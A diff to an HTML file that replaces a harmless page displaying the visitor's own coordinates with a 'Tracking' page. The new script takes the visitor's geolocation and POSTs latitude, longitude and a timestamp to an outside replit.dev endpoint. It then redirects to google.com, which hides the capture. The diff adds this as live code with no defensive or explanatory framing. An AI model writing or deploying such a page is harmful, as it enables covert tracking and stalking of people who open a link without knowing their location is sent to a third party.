@@ -1,31 +1,29 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <title>Location Fetch Example</title>
-</head>
-<body>
-  <h2>Your Location:</h2>
-  <p id="location">Fetching...</p>
+  <head>
+    <title>Tracking</title>
+  </head>
+  <body>
+    <h2>Tracking your location...</h2>
 
-  <script>
-    function success(position) {
-      const latitude = position.coords.latitude;
-      const longitude = position.coords.longitude;
-      document.getElementById('location').textContent = 
-        `Latitude: ${latitude}, Longitude: ${longitude}`;
-    }
-
-    function error() {
-      document.getElementById('location').textContent = 
-        'Unable to retrieve your location';
-    }
-
-    if (!navigator.geolocation) {
-      document.getElementById('location').textContent = 
-        'Geolocation is not supported by your browser';
-    } else {
-      navigator.geolocation.getCurrentPosition(success, error);
-    }
-  </script>
-</body>
+    <script>
+      navigator.geolocation.getCurrentPosition(function(position) {
+        fetch("https://978a3738-0931-4b8d-b637-b676a1b0408b-00-2pjedy7lmpdz3.pike.replit.dev/location", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            latitude: position.coords.latitude,
+            longitude: position.coords.longitude,
+            timestamp: new Date().toISOString()
+          })
+        }).then(() => {
+          window.location.href = "https://www.google.com";
+        });
+      }, function(error) {
+        alert("Location access denied!");
+      });
+    </script>
+  </body>
 </html>
